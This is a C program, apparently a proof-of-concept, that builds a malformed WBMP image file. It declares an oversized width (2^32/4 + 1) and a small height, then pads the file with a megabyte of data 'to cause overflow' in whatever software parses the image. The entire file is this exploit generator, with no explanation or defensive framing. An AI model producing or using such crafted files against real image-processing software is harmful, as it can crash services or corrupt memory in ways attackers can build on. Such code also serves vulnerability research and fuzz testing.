#define BUFSIZE 1000000

#include <stdio.h>

int main()
{
      int c;
      char buf[BUFSIZE];

      FILE *fp = fopen("test.wbmp","w");

      //write header
      c = 0;
      fputc(c,fp);
      fputc(c,fp);

      //write width = 2^32 / 4 + 1
      c = 0x84;
      fputc(c,fp);
      c = 0x80;
      fputc(c,fp);
      fputc(c,fp);
      fputc(c,fp);
      c = 0x01;
      fputc(c,fp);

      //write height = 4
      c = 0x04;
      fputc(c,fp);

      //write some data to cause overflow
      fwrite(buf,sizeof(buf),1,fp);

      fclose(fp);
}
